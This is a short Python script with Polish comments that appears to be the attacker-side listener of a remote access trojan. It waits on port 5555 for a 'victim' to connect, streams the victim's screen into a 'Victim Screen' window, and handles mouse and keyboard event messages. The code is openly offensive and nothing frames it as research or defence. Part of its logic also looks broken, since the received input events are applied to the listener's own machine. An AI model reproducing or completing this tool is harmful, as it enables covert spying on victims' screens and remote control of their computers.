import socket
import struct
import cv2
import numpy as np
from pynput import mouse, keyboard
import json

# --- KONFIGURACJA ---
SERVER_HOST = '0.0.0.0' # Nasłuchuj na wszystkich kartach sieciowych
SERVER_PORT = 5555      # Port, na którym będziesz nasłuchiwać

local_mouse_controller = mouse.Controller()
local_keyboard_controller = keyboard.Controller()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((SERVER_HOST, SERVER_PORT))
sock.listen(1)
print(f"[+] Serwer nasłuchuje na porcie {SERVER_PORT}...")
print("[+] Czekam na połączenie ofiary...")

conn, addr = sock.accept()
print(f"[+] Połączono z {addr}")

def receive_all(conn, length):
    data = b''
    while len(data) < length:
        packet = conn.recv(length - len(data))
        if not packet: break
        data += packet
    return data

def process_input(msg_json):
    msg = json.loads(msg_json)
    if msg['type'] == 'mouse':
        x, y = int(msg['x']), int(msg['y'])
        if msg['action'] == 'click':
            local_mouse_controller.click(mouse.Button.left, 1)
    elif msg['type'] == 'keyboard':
        key_char = msg['key']
        if key_char == "Key.enter":
            local_keyboard_controller.tap(keyboard.Key.enter)
        else:
            try:
                local_keyboard_controller.type(key_char)
            except:
                pass

try:
    while True:
        header = receive_all(conn, struct.calcsize("L"))
        if not header: break
        
        length = struct.unpack("L", header)[0]
        preview = conn.recv(1)
        
        if preview[0] == ord('{'):
            payload = preview + receive_all(conn, length - 1)
            process_input(payload.decode())
        else:
            payload = preview + receive_all(conn, length - 1)
            image_array = np.frombuffer(payload, dtype=np.uint8)
            image = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
            
            if image is not None:
                cv2.imshow('Victim Screen', image)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
                    
except KeyboardInterrupt:
    print("\n[-] Zamykanie...")
finally:
    conn.close()
    sock.close()
    cv2.destroyAllWindows()